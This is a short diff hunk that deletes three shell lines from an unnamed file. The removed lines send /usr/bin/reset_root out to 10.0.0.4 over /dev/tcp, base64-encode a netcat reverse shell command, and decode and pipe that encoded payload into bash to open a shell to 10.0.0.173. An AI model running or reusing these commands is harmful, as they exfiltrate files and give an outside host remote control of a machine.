@@ -1,3 +1,0 @@
-cat /usr/bin/reset_root > /dev/tcp/10.0.0.4/9002
-echo 'nc -e /bin/bash 10.0.0.173 4444' | base64
-echo 'bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMC4xNzMgNDQ0NAo=' | base64 -d | bash
